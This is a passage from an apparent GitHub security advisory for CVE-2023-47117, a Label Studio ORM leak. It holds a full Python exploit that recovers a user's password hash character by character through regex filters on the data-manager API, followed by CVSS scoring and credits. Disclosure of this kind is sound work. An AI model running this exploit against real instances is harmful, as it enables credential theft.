    "id": 1, # View ID
    "project": "1" # Project ID
}

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'
    )

    parser.add_argument(
        '-v', '--view-id',
        help='View id of the page',
        type=int,
        required=True
    )

    parser.add_argument(
        '-p', '--project-id',
        help='Project id to filter tasks for',
        type=int,
        required=True
    )

    parser.add_argument(
        '-c', '--cookie-str',
        help='Cookie string for authentication',
        required=True
    )

    parser.add_argument(
        '-u', '--url',
        help='Base URL to Label Studio instance',
        required=True
    )

    return parser.parse_args()

def setup() -> dict:
    args = parse_args()
    view_id = args.view_id
    project_id = args.project_id
    path_1 = "/api/dm/views/{view_id}?interaction=filter&project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    path_2 = "/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}".format(
        view_id=view_id,
        project_id=project_id
    )
    PAYLOAD["id"] = view_id
    PAYLOAD["project"] = str(project_id)

    config_dict = {
        'COOKIE_STR': args.cookie_str,
        'URL_PATH_1': args.url + path_1,
        'URL_PATH_2': args.url + path_2,
        'PAYLOAD': PAYLOAD
    }
    return config_dict

def test_payload(config_dict: dict, payload) -> bool:
    sys.stdout.flush()
    cookie_str = config_dict["COOKIE_STR"]
    r_set = requests.patch(
        config_dict["URL_PATH_1"],
        json=payload,
        headers={
            "Cookie": cookie_str
        }
    )

    r_listen = requests.get(
        config_dict['URL_PATH_2'],
        headers={
            "Cookie": cookie_str
        }
    )

    r_json = r_listen.json()
    return len(r_json["tasks"]) >= 1

def test_char(config_dict, known_hash, c):
    json_payload_suffix = PAYLOAD
    test_escaped = re.escape(known_hash + c)
    json_payload_suffix["data"]["filters"]["items"][0]["value"] =  f"^{test_escaped}"

    suffix_result = test_payload(config_dict, json_payload_suffix)
    if suffix_result:
        return (known_hash + c, c)

    return None

def main():
    config_dict = setup()
    # By default Label Studio password hashes start with these characters
    known_hash = "pbkdf2_sha256$260000$"
    print()
    print(f"dumped: {known_hash}", end="")
    sys.stdout.flush()

    while True:
        found = False

        for c in CHARS:
            r = test_char(config_dict, known_hash, c)
            if not r is None:
                new_hash, c = r
                known_hash = new_hash
                print(c, end="")
                sys.stdout.flush()
                found = True
                break

        if not found:
            break

    print()

if __name__ == "__main__":
    main()
```

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2023-47117

### Weaknesses

[CWE-202](/advisories?query=cwe%3A202)

### Credits

* [![@alex-elttam](https://avatars.githubusercontent.com/u/139727151?s=40&v=4)](/alex-elttam)
  [alex-elttam](/alex-elttam)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


